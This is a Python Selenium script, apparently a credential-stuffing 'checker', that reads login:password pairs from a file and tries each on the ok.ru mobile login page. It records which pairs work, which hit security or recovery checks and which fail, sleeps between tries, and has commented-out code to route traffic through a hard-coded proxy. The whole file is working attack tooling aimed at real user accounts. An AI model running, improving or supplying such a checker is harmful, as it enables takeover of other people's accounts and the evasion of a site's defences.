# -*- coding: utf-8 -*-
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import time

__author__ = 'Yuriy Skornyakov'
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver import DesiredCapabilities, Proxy

proxy = '--proxy-server=146.185.200.198:8085'


#set proxy
#options = Options()
#options.add_argument(proxy)


def auth_test(login, password):
    #init Driver
    driver = webdriver.Firefox()
    line = ':'.join([login,password])
    #open site
    base_url = "http://m.ok.ru/"
    driver.get(base_url)

    #find 'login' and 'password' fields
    login_field = driver.find_element_by_id("field_login")
    password_field = driver.find_element_by_id("field_password")

    #try to auth
    login_field.clear()
    login_field.send_keys(login)
    password_field.clear()
    password_field.send_keys(password, Keys.ENTER)
    if ("Безопасность - это ОК!" in driver.page_source) or ("Восстановление доступа" in driver.page_source):
        output_not_good = open('outout_not_good.txt', 'a')
        output_not_good.write(line)
        output_not_good.close()

    elif ("Неверный логин или пароль" in driver.page_source):

        output_bad = open('output_bad.txt','a')
        output_bad.write(line)
        output_bad.close()
    else:
        output_good = open('output_good.txt', 'a')
        output_good.write(line)
        output_good.close()
    driver.quit()


if (__name__=="__main__"):
    input_file = open('input.txt', 'r')
    for line in input_file:
        try:
            login,password = line.split(':')
        except:
            login,password = line.split(' ')
        try:
            time.sleep(5)
            auth_test(login,password)
        except OSError:
            time.sleep(5)
            print(line)
            not_checked = open('not_checked.txt', 'a')
            not_checked.write(line)
            not_checked.close()
    input_file.close()



